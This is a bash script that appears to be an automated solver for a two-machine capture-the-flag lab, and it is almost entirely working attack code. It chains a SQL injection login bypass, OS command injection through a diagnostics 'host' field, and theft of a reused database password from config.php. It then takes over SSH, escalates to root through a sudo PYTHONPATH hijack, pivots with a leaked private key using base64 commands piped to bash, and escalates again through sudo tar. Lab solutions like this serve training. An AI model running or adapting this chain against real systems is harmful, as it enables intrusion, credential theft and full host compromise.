#!/usr/bin/env bash
# ===========================================================================
# Observ -- UGC autopwn (full chain, non-interactive)
#
# Automatically exploits the two-machine chain end to end and prints all four
# flags. Intended to be run from an attacking host (e.g. Kali) that can reach
# Machine 1 (web). Machine 2 (internal) is reached by pivoting through M1.
#
# Requirements on the attacker: bash, curl, ssh, sshpass, python3.
#
# Usage:   ./autopwn.sh <M1_HOST> [M1_HTTP_PORT] [M1_SSH_PORT]
#   e.g.   ./autopwn.sh 192.168.120.50
#          ./autopwn.sh 127.0.0.1 80 2222
#
# Exit code 0 only if all four flags are captured.
# ===========================================================================
set -u

M1="${1:?usage: autopwn.sh <M1_HOST> [http_port] [ssh_port]}"
HTTP_PORT="${2:-80}"
SSH_PORT="${3:-22}"

DEV_USER="developer"
SQLI="admin' -- -"
BASE="http://${M1}:${HTTP_PORT}"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
COOKIE="$WORK/cookies.txt"
SSHOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR"

log()  { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; exit 1; }

for t in curl ssh sshpass python3; do
    command -v "$t" >/dev/null 2>&1 || die "missing required tool: $t"
done

# --- 0. wait for the web service -------------------------------------------
log "waiting for web service at ${BASE} ..."
for i in $(seq 1 60); do
    curl -s -o /dev/null -m 3 "${BASE}/index.php" && break
    sleep 2
    [ "$i" = 60 ] && die "web service never came up"
done

# --- 1. SQL injection: authentication bypass -------------------------------
log "M1: SQL injection auth bypass on /index.php"
REDIR=$(curl -s -c "$COOKIE" -o /dev/null -w '%{redirect_url}' \
    --data-urlencode "username=${SQLI}" --data-urlencode "password=x" \
    "${BASE}/index.php")
case "$REDIR" in
    *dashboard.php) ok "authenticated (redirect -> $REDIR)";;
    *) die "SQLi bypass failed (redirect='$REDIR')";;
esac

# Helper: run a shell command on M1 as www-data via the command injection.
rce() {
    curl -s -b "$COOKIE" --data-urlencode "host=127.0.0.1; $1" \
        "${BASE}/monitor/diag.php" \
    | python3 -c 'import sys,html,re; m=re.search(r"<pre>(.*?)</pre>",sys.stdin.read(),re.S); print(html.unescape(m.group(1)) if m else "")'
}

# --- 2. OS command injection: foothold as www-data -------------------------
log "M1: OS command injection on /monitor/diag.php"
WHO=$(rce 'id' | grep -o 'uid=33(www-data)' | head -1)
[ -n "$WHO" ] || die "command injection failed"
ok "code execution as www-data"

# --- 3. loot config.php -> developer password (credential reuse) -----------
log "M1: reading /var/www/html/config.php for reused credentials"
DEV_PASS=$(rce "grep DB_PASS /var/www/html/config.php | head -1" \
    | sed -n "s/.*'\(.*\)'.*/\1/p" | head -1)
[ -n "$DEV_PASS" ] || die "could not extract DB password"
ok "recovered reused password: ${DEV_PASS}"

SSH_M1() { sshpass -p "$DEV_PASS" ssh $SSHOPTS -p "$SSH_PORT" "${DEV_USER}@${M1}" "$@"; }

log "M1: SSH in as ${DEV_USER} using the reused password"
HN=$(SSH_M1 'hostname' 2>/dev/null)
[ -n "$HN" ] || die "ssh as developer failed"
ok "shell as developer@${HN}"

FLAG_M1_LOCAL=$(SSH_M1 'cat ~/local.txt' 2>/dev/null)
[ -n "$FLAG_M1_LOCAL" ] && ok "M1 local.txt  = ${FLAG_M1_LOCAL}"

# --- 4. privesc on M1: sudo + PYTHONPATH hijack ----------------------------
log "M1: privilege escalation via sudo PYTHONPATH hijack"
FLAG_M1_PROOF=$(SSH_M1 '
    d=$(mktemp -d)
    printf "%s" "import os; os.setuid(0); os.system(\"cat /root/proof.txt\")" > "$d/netcheck.py"
    sudo -n PYTHONPATH="$d" /usr/bin/python3 /opt/health/check.py 2>/dev/null
' 2>/dev/null | grep -o 'OBSERV{[^}]*}' | head -1)
[ -n "$FLAG_M1_PROOF" ] && ok "M1 proof.txt  = ${FLAG_M1_PROOF}"

# --- 5. pivot: discover internal host + leaked key -------------------------
log "pivot: discovering internal host and leaked svc_backup key on M1"
M2=$(SSH_M1 'awk "/HostName/{print \$2}" ~/.ssh/config 2>/dev/null | head -1' 2>/dev/null)
[ -n "$M2" ] || M2="172.20.0.3"
HAVEKEY=$(SSH_M1 'test -f ~/.ssh/svc_backup_id_ed25519 && echo yes' 2>/dev/null)
[ "$HAVEKEY" = "yes" ] || die "could not locate pivot key on M1"
ok "internal host = ${M2}; located svc_backup private key on M1"

# Pivot WITHOUT ProxyJump: hop via M1 (sshpass -> developer), then from M1 use
# the leaked key to reach M2. The M2 command is base64-wrapped to stay quoting-
# safe across the two SSH layers.
RJUMP="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -i ~/.ssh/svc_backup_id_ed25519 svc_backup@${M2}"
SSH_M2() {
    local b64; b64=$(printf '%s' "$1" | base64 | tr -d '\n')
    SSH_M1 "${RJUMP} \"echo ${b64} | base64 -d | bash\""
}

# --- 6. foothold on M2 -----------------------------------------------------
log "M2: SSH foothold as svc_backup (pivoted through M1)"
HN2=$(SSH_M2 'hostname' 2>/dev/null)
[ -n "$HN2" ] || die "pivot ssh to M2 failed"
ok "shell as svc_backup@${HN2}"

FLAG_M2_LOCAL=$(SSH_M2 'cat ~/local.txt' 2>/dev/null)
[ -n "$FLAG_M2_LOCAL" ] && ok "M2 local.txt  = ${FLAG_M2_LOCAL}"

# --- 7. privesc on M2: sudo tar (GTFOBins) ---------------------------------
log "M2: privilege escalation via sudo tar (GTFOBins)"
FLAG_M2_PROOF=$(SSH_M2 \
    "sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/proof.txt' 2>/dev/null" \
    2>/dev/null | grep -o 'OBSERV{[^}]*}' | head -1)
[ -n "$FLAG_M2_PROOF" ] && ok "M2 proof.txt  = ${FLAG_M2_PROOF}"

# --- summary ----------------------------------------------------------------
echo
echo "================ FLAGS ================"
printf 'M1 local.txt : %s\n' "${FLAG_M1_LOCAL:-<MISSING>}"
printf 'M1 proof.txt : %s\n' "${FLAG_M1_PROOF:-<MISSING>}"
printf 'M2 local.txt : %s\n' "${FLAG_M2_LOCAL:-<MISSING>}"
printf 'M2 proof.txt : %s\n' "${FLAG_M2_PROOF:-<MISSING>}"
echo "======================================"

[ -n "${FLAG_M1_LOCAL:-}" ] && [ -n "${FLAG_M1_PROOF:-}" ] && \
[ -n "${FLAG_M2_LOCAL:-}" ] && [ -n "${FLAG_M2_PROOF:-}" ] || \
    die "one or more flags were not captured"

ok "ALL FOUR FLAGS CAPTURED -- full chain owned"
